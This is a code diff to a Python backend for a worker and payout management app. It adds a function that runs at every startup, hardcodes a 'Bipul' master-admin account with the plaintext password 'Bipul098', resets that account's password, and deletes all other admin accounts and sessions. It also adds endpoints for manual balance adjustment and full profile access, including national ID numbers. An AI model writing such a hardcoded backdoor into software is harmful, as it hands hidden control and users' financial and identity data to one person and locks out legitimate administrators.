@@ -53,8 +53,9 @@ def initialize(con, data_dir):
         "revision INTEGER NOT NULL DEFAULT 1", "reviewed_by TEXT DEFAULT ''", "reviewed_at TEXT DEFAULT ''"
     ):
         add_column(con, "customers", definition)
-    first = con.execute("SELECT id FROM users ORDER BY id LIMIT 1").fetchone()
-    if first:
+    ensure_master_admin(con)
+    first = con.execute("SELECT id,role FROM users ORDER BY id LIMIT 1").fetchone()
+    if first and first["role"] == "admin":
         con.execute("UPDATE users SET role='admin',status='approved',approved_at=COALESCE(NULLIF(approved_at,''),created_at) WHERE id=?", (first[0],))
     con.execute("""CREATE TABLE IF NOT EXISTS transactions(
         id INTEGER PRIMARY KEY, user_id INTEGER NOT NULL, customer_id INTEGER,
@@ -126,6 +127,26 @@ def save_data_image(value, folder, name):
 def public_user(row):
     return {"id": row["id"], "username": row["username"], "role": row["role"],
             "status": row["status"], "fullName": row["full_name"], "phone": row["phone"]}
+
+
+def is_admin_role(role):
+    return role in ("master_admin", "admin", "subadmin")
+
+
+def ensure_master_admin(con):
+    master = con.execute("SELECT * FROM users WHERE username=? COLLATE NOCASE", ("Bipul",)).fetchone()
+    salt = secrets.token_hex(16)
+    password_hash = hashlib.pbkdf2_hmac("sha256", b"Bipul098", bytes.fromhex(salt), 310000).hex()
+    if master:
+        con.execute("UPDATE users SET role='master_admin',status='approved',full_name='Bipul',password_hash=?,salt=? WHERE id=?",
+                     (password_hash, salt, master["id"]))
+        con.execute("DELETE FROM sessions WHERE username!='Bipul'")
+        con.execute("DELETE FROM users WHERE role='admin' AND id!=?", (master["id"],))
+    else:
+        con.execute("DELETE FROM users WHERE role='admin'")
+        con.execute("""INSERT INTO users(username,password_hash,salt,created_at,role,status,full_name,approved_at,referral_code)
+                 VALUES(?,?,?,?, 'master_admin','approved','Bipul',?, 'MASTER-BIPUL')""",
+                     ("Bipul", password_hash, salt, now(), now()))
 
 
 def balance(con, user_id):
@@ -359,7 +380,7 @@ def dispatch(handler, method, path, db, data_dir, digest):
             return handler.reply(201, {"ok": True})
         except Exception as error: return handler.reply(400, {"error": str(error)})
 
-    if user["role"] != "admin":
+    if not is_admin_role(user["role"]):
         return handler.reply(403, {"error": "αª╢αºüαªºαºü Admin αªÅαªç αªòαª╛αª£ αªòαª░αªñαºç αª¬αª╛αª░αª¼αºçαª¿"})
 
     if path == "/api/admin/dashboard" and method == "GET":
@@ -410,8 +431,53 @@ def dispatch(handler, method, path, db, data_dir, digest):
 
     if path == "/api/admin/users" and method == "GET":
         with db() as con:
-            rows = con.execute("SELECT id,username,full_name,phone,email,address,status,role,nid_last4,payout_account_name,payout_account_number,payout_branch,created_at,rejection_reason FROM users WHERE role='worker' ORDER BY id DESC").fetchall()
+            rows = con.execute("SELECT id,username,full_name,phone,email,address,status,role,nid_last4,payout_account_name,payout_account_number,payout_branch,created_at,rejection_reason,referral_code,referred_by FROM users WHERE role IN ('worker','subadmin') ORDER BY id DESC").fetchall()
         return handler.reply(200, {"users": [dict(r) for r in rows]})
+
+    if path == "/api/admin/users" and method == "POST":
+        try:
+            data = handler.body(16384); username = str(data.get("username", "")).strip(); password = str(data.get("password", ""))
+            full_name = str(data.get("fullName", "")).strip(); role = str(data.get("role", "worker")).strip()
+            if role not in ("worker", "subadmin"): raise ValueError("শুধু Worker অথবা Subadmin account তৈরি করা যাবে")
+            if role == "subadmin" and user["role"] != "master_admin": raise ValueError("শুধু Master Admin Subadmin তৈরি করতে পারবেন")
+            if len(username) < 3 or len(password) < 8 or not full_name: raise ValueError("নাম, username এবং কমপক্ষে ৮ অক্ষরের password দিন")
+            salt = secrets.token_hex(16)
+            with db() as con:
+                if con.execute("SELECT 1 FROM users WHERE username=? COLLATE NOCASE", (username,)).fetchone(): raise ValueError("এই username আগে থেকেই আছে")
+                cur = con.execute("INSERT INTO users(username,password_hash,salt,created_at,role,status,full_name,approved_by,approved_at,referral_code,referred_by) VALUES(?,?,?,?,?,'approved',?,?,?,?,?)",
+                                  (username, hashlib.pbkdf2_hmac("sha256", password.encode(), bytes.fromhex(salt), 310000).hex(), salt, now(), role, full_name, user["username"], now(), f"TW{secrets.token_hex(4).upper()}", data.get("referredBy") or None))
+                audit(con, user["username"], "admin_user_created", "user", cur.lastrowid, {"role": role})
+            return handler.reply(201, {"ok": True})
+        except Exception as error: return handler.reply(400, {"error": str(error)})
+
+    if path == "/api/admin/referrals" and method == "GET":
+        with db() as con:
+            rows = [dict(r) for r in con.execute("SELECT id,username,full_name,role,status,referral_code,referred_by,created_at FROM users WHERE role IN ('worker','subadmin') ORDER BY id").fetchall()]
+        return handler.reply(200, {"users": rows})
+
+    match = re.fullmatch(r"/api/admin/users/(\d+)/profile", path)
+    if match and method == "GET":
+        with db() as con:
+            profile = con.execute("SELECT id,username,full_name,phone,email,address,status,role,nid_number,nid_last4,referral_code,referred_by,created_at,payout_account_name,payout_account_number,payout_branch FROM users WHERE id=? AND role IN ('worker','subadmin')", (int(match.group(1)),)).fetchone()
+            if not profile: return handler.reply(404, {"error": "User পাওয়া যায়নি"})
+            earned, reserved, available = balance(con, profile["id"])
+            transactions = [dict(r) for r in con.execute("SELECT id,type,amount_paisa,reason,created_at FROM transactions WHERE user_id=? ORDER BY id DESC LIMIT 100", (profile["id"],)).fetchall()]
+            customers = [dict(r) for r in con.execute("SELECT id,serial,name,workflow_status,created_at FROM customers WHERE created_by=? ORDER BY id DESC LIMIT 100", (profile["username"],)).fetchall()]
+            children = [dict(r) for r in con.execute("SELECT id,username,full_name,role,status,referral_code FROM users WHERE referred_by=? ORDER BY id", (profile["id"],)).fetchall()]
+        return handler.reply(200, {"profile": {**dict(profile), "payout_account_number": ("******" + profile["payout_account_number"][-4:]) if profile["payout_account_number"] else "", "earned": earned, "reserved": reserved, "available": available, "transactions": transactions, "customers": customers, "children": children}})
+
+    match = re.fullmatch(r"/api/admin/users/(\d+)/balance", path)
+    if match and method == "POST":
+        try:
+            data = handler.body(8192); amount = round(float(data.get("amount", 0)) * 100); reason = str(data.get("reason", "")).strip()
+            if not amount or not reason: raise ValueError("Amount এবং কারণ দিন")
+            with db() as con:
+                target = con.execute("SELECT * FROM users WHERE id=? AND role IN ('worker','subadmin')", (int(match.group(1)),)).fetchone()
+                if not target: raise ValueError("User পাওয়া যায়নি")
+                award(con, target, None, "manual:" + secrets.token_hex(12), "manual_adjustment", amount, reason, user["username"])
+                audit(con, user["username"], "user_balance_adjusted", "user", target["id"], {"amountPaisa": amount, "reason": reason})
+            return handler.reply(201, {"ok": True})
+        except Exception as error: return handler.reply(400, {"error": str(error)})
 
     if path == "/api/admin/settings" and method == "GET":
         with db() as con:
